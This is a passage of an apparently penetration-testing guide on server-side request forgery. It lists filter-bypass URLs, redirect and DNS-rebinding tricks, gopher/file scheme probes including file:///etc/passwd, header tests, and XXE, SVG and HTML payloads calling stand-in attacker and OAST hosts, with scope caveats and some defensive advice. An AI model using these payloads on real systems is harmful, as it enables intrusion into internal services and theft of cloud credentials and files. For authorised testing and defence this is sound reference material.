+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>instance-id
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>region
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>project-id
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>role name
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>service account email
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>metadata service reachable / not reachable
+</span></code></pre></div>
+<p>Do not use temporary credentials unless the engagement scope explicitly allows it.</p>
+<hr />
+<h2 id="bypassing-ssrf-defenses">Bypassing SSRF Defenses</h2>
+<p>SSRF filters are often bypassable because URL parsing is surprisingly complex. The validator, reverse proxy, framework, DNS resolver, and HTTP client may not agree on what the final destination is.</p>
+<hr />
+<h2 id="denylist-bypasses">Denylist Bypasses</h2>
+<p>A denylist might block strings such as:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>localhost
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>127.0.0.1
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>169.254.169.254
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>/admin
+</span></code></pre></div>
+<p>Try alternative loopback representations:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>http://127.1/
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>http://127.0.1/
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>http://127.000000000000.1/
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>http://0/
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>http://0.0.0.0/
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>http://[::1]/
+</span></code></pre></div>
+<p>Decimal IP:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>http://2130706433/        # 127.0.0.1
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>http://3232235521/        # 192.168.0.1
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>http://3232235777/        # 192.168.1.1
+</span></code></pre></div>
+<p>Octal IP:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>http://0177.0000.0000.0001/
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>http://017700000001/
+</span></code></pre></div>
+<p>Hex IP:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>http://0x7f000001/
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>http://0xc0a80001/
+</span></code></pre></div>
+<p>Mixed notation:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>http://0x7f.0.0.1/
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>http://127.0x00.0000.1/
+</span></code></pre></div>
+<p>Unicode / alternative dot:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>http://127。0。0。1/
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>http://127%E3%80%820%E3%80%820%E3%80%821/
+</span></code></pre></div>
+<p>DNS names resolving to local or private addresses:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>http://127.0.0.1.nip.io/
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>http://customer1.app.127.0.0.1.nip.io/
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>http://localtest.me/
+</span></code></pre></div>
+<p>Encoding tricks:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>http://local%68ost/
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>http://127.0.0.1/%61dmin
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>http://127.0.0.1/%2561dmin
+</span></code></pre></div>
+<p>Case variation:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>http://LocalHost/
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>http://LOCALHOST/
+</span></code></pre></div>
+<hr />
+<h2 id="allowlist-bypasses">Allowlist Bypasses</h2>
+<p>Allowlist mistakes often happen when the application checks whether the input “starts with” or “contains” a trusted domain.</p>
+<p>Assume the allowed domain is:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>trusted.example.com
+</span></code></pre></div>
+<p>Userinfo confusion:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>https://trusted.example.com@attacker.example/
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>https://trusted.example.com:password@attacker.example/
+</span></code></pre></div>
+<p>Subdomain confusion:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>https://trusted.example.com.attacker.example/
+</span></code></pre></div>
+<p>Fragment confusion:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>https://attacker.example#trusted.example.com
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>https://attacker.example%23trusted.example.com
+</span></code></pre></div>
+<p>Query confusion:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>https://attacker.example/?next=trusted.example.com
+</span></code></pre></div>
+<p>Path confusion:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>https://attacker.example/trusted.example.com
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>https://attacker.example\trusted.example.com/
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>https://attacker.example/.trusted.example.com
+</span></code></pre></div>
+<p>Null byte / newline style confusion:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>https://attacker.example%00trusted.example.com
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>https://attacker.example%0Atrusted.example.com
+</span></code></pre></div>
+<p>Parameter pollution:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>next=trusted.example.com&amp;next=http://127.0.0.1/admin
+</span></code></pre></div>
+<p>Path traversal when only a path is controlled:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>x/../private
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>safe/../../admin
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>%2e%2e/%2e%2e/admin
+</span></code></pre></div>
+<hr />
+<h2 id="redirect-based-bypass">Redirect-Based Bypass</h2>
+<p>If the application validates only the first URL and then follows redirects, an attacker-controlled redirect can point the server to a blocked destination.</p>
+<p>Example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>https://trusted.example.com/redirect?to=http://127.0.0.1/admin
+</span></code></pre></div>
+<p>or:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>https://attacker.example/redirect-to-localhost
+</span></code></pre></div>
+<p>Server-side redirect response:</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="na">Location</span><span class="o">:</span> <span class="l">http://127.0.0.1/admin</span>
+</span></code></pre></div>
+<p>Test different redirect codes:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>301
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>302
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>303
+</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>307
+</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>308
+</span></code></pre></div>
+<p>Also test redirecting between schemes:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>https://allowed.example/redirect → http://127.0.0.1/
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>http://allowed.example/redirect  → gopher://127.0.0.1:80/_
+</span></code></pre></div>
+<p>A secure fetcher should either disable redirects or revalidate every redirect destination after DNS resolution.</p>
+<hr />
+<h2 id="dns-rebinding-dns-pinning-issues">DNS Rebinding / DNS Pinning Issues</h2>
+<p>DNS rebinding abuses time-of-check/time-of-use differences.</p>
+<p>Typical idea:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>1. Validator resolves attacker.example to a public IP.
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>2. Application accepts the URL.
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>3. Later, HTTP client resolves the same domain again.
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>4. DNS now returns 127.0.0.1, 10.x.x.x, 169.254.169.254, or another internal IP.
+</span></code></pre></div>
+<p>Potential test domains:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>attacker-controlled-domain.example
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>low-TTL DNS record
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>A record changes from public IP to private IP
+</span></code></pre></div>
+<p>Defensive expectation:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>resolve once
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>verify all A/AAAA records
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>reject private/link-local/loopback/multicast/reserved ranges
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>connect to the verified IP
+</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a>send the expected Host header explicitly
+</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a>revalidate after redirects
+</span></code></pre></div>
+<hr />
+<h2 id="parser-confusion-payloads">Parser Confusion Payloads</h2>
+<p>URL parsers may disagree about scheme, host, path, userinfo, fragments, slashes, and backslashes.</p>
+<p>Try:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>https:attacker.example
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>https:/attacker.example
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>//attacker.example
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>/\/attacker.example/
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>\\/\/attacker.example/
+</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a>@attacker.example
+</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a>#attacker.example
+</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a>#%20@attacker.example
+</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a>http://169.254.169.254\@attacker.example/
+</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a>http://localhost:\@trusted.example/../
+</span></code></pre></div>
+<p>Interesting characters:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>@
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>#
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>?
+</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a>\
+</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a>/
+</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a>;
+</span><span id="__span-53-7"><a id="__codelineno-53-7" name="__codelineno-53-7" href="#__codelineno-53-7"></a>:
+</span><span id="__span-53-8"><a id="__codelineno-53-8" name="__codelineno-53-8" href="#__codelineno-53-8"></a>%00
+</span><span id="__span-53-9"><a id="__codelineno-53-9" name="__codelineno-53-9" href="#__codelineno-53-9"></a>%0a
+</span><span id="__span-53-10"><a id="__codelineno-53-10" name="__codelineno-53-10" href="#__codelineno-53-10"></a>%0d%0a
+</span><span id="__span-53-11"><a id="__codelineno-53-11" name="__codelineno-53-11" href="#__codelineno-53-11"></a>%E3%80%82
+</span></code></pre></div>
+<p>Always compare how the application validates the URL with how the backend HTTP client actually requests it.</p>
+<hr />
+<h2 id="protocol-based-ssrf">Protocol-Based SSRF</h2>
+<p>Some URL fetchers support more than HTTP/HTTPS. Non-HTTP schemes can significantly increase impact.</p>
+<h3 id="file">file://</h3>
+<p>May read local files if the library allows it.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>file:///etc/passwd
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>file:///c:/windows/win.ini
+</span></code></pre></div>
+<h3 id="dict">dict://</h3>
+<p>Can be used to speak to text-based TCP services.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>dict://127.0.0.1:11211/stats
+</span></code></pre></div>
+<h3 id="gopher">gopher://</h3>
+<p>Gopher can send raw bytes to arbitrary TCP services. This can sometimes transform SSRF from “read a URL” into “speak a protocol.”</p>
+<p>Simple HTTP-over-gopher probe:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>gopher://127.0.0.1:8080/_GET%20/%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A
+</span></code></pre></div>
+<p>Simple SMTP banner-style probe:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>gopher://127.0.0.1:25/_HELO%20localhost%0D%0AQUIT%0D%0A
+</span></code></pre></div>
+<p>Use protocol payloads carefully. Payloads that mutate Redis, databases, mail servers, Docker, or internal APIs should only be used when explicitly authorized.</p>
+<h3 id="ftp-sftp-tftp">ftp://, sftp://, tftp://</h3>
+<p>These may trigger outbound connections useful for blind SSRF detection, protocol fingerprinting, or egress testing.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>ftp://attacker.example/test
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>sftp://attacker.example:2222/test
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>tftp://attacker.example:69/test
+</span></code></pre></div>
+<h3 id="ldap">ldap://</h3>
+<p>Can sometimes interact with LDAP or text-based services depending on library behavior.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>ldap://127.0.0.1:389/
+</span></code></pre></div>
+<hr />
+<h2 id="ssrf-via-host-header">SSRF via Host Header</h2>
+<p>Host header issues appear when reverse proxies, caches, routers, or back-end frameworks trust the supplied <code>Host</code> value.</p>
+<p>Basic test:</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">attacker.example</span>
+</span></code></pre></div>
+<p>Line wrapping / duplicate-style test:</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a> <span class="l">Host: attacker.example</span>
+</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a><span class="na">Host</span><span class="o">:</span> <span class="l">vulnerable.example</span>
+</span></code></pre></div>
+<p>Absolute URL request-line test:</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="nf">GET</span> <span class="nn">http://127.0.0.1:8080/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">vulnerable.example</span>
+</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></code></pre></div>
+<p>Potential signals:</p>
+<ul>
+<li>backend fetches attacker-controlled host</li>
+<li>password reset links use attacker host</li>
+<li>cache poisoning behavior</li>
+<li>proxy forwards absolute-form URL</li>
+<li>internal response is returned instead of normal public response</li>
+</ul>
+<hr />
+<h2 id="ssrf-via-referer-header">SSRF via Referer Header</h2>
+<p>Some analytics, link-preview, anti-fraud, or logging systems fetch URLs found in <code>Referer</code>.</p>
+<p>Example:</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="nf">GET</span> <span class="nn">/product/1</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span>
+</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">vulnerable.example</span>
+</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a><span class="na">Referer</span><span class="o">:</span> <span class="l">http://ssrf-probe-73921.oast.example/</span>
+</span></code></pre></div>
+<p>This is often blind. Check your OAST listener for DNS/HTTP callbacks.</p>
+<p>Other headers worth testing in authorized environments:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>Referer
+</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>Origin
+</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>X-Forwarded-Host
+</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>X-Forwarded-For
+</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a>X-Original-URL
+</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a>X-Rewrite-URL
+</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a>X-Forwarded-Scheme
+</span><span id="__span-64-8"><a id="__codelineno-64-8" name="__codelineno-64-8" href="#__codelineno-64-8"></a>X-Forwarded-Proto
+</span><span id="__span-64-9"><a id="__codelineno-64-9" name="__codelineno-64-9" href="#__codelineno-64-9"></a>X-Real-IP
+</span><span id="__span-64-10"><a id="__codelineno-64-10" name="__codelineno-64-10" href="#__codelineno-64-10"></a>Forwarded
+</span></code></pre></div>
+<hr />
+<h2 id="ssrf-via-xml-xxe">SSRF via XML / XXE</h2>
+<p>If the application parses XML, external entities may trigger server-side requests.</p>
+<p>Example shape:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://ssrf-probe-73921.oast.example/xxe&quot;&gt;</span>
+</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a>]&gt;
+</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a><span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Potential targets:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>http://127.0.0.1/
+</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>http://169.254.169.254/
+</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>file:///etc/passwd
+</span></code></pre></div>
+<p>XXE may cause SSRF, local file read, or both depending on parser settings.</p>
+<hr />
+<h2 id="ssrf-via-svg-html-markdown">SSRF via SVG / HTML / Markdown</h2>
+<p>Renderers may fetch external resources while generating previews.</p>
+<p>SVG example:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a><span class="w">  </span><span class="nt">&lt;image</span><span class="w"> </span><span class="na">href=</span><span class="s">&quot;http://ssrf-probe-73921.oast.example/svg&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div>
+<p>HTML example:</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://ssrf-probe-73921.oast.example/img&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a><span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;http://ssrf-probe-73921.oast.example/style.css&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://ssrf-probe-73921.oast.example/frame&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<p>CSS example:</p>
+<div class="language-css highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="nt">body</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a><span class="w">  </span><span class="k">background-image</span><span class="p">:</span><span class="w"> </span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;http://ssrf-probe-73921.oast.example/css&quot;</span><span class="p">);</span>
+</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Markdown example:</p>
+<div class="language-markdown highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>![<span class="nt">probe</span>](<span class="na">http://ssrf-probe-73921.oast.example/markdown</span>)
+</span></code></pre></div>
+<p>Look especially at:</p>
+<ul>
+<li>profile rendering</li>
+<li>rich text editors</li>
+<li>admin previews</li>
+<li>PDF export</li>
+<li>invoice generation</li>
+<li>ticketing systems</li>
+<li>email template previews</li>
+<li>Open Graph / URL preview fetchers</li>
+</ul>
+<hr />
+<h2 id="ssrf-via-pdf-generators">SSRF via PDF Generators</h2>
+<p>HTML-to-PDF tools are common blind SSRF gadgets. They may fetch images, stylesheets, fonts, iframes, or scripts during rendering.</p>
+<p>Basic probe:</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
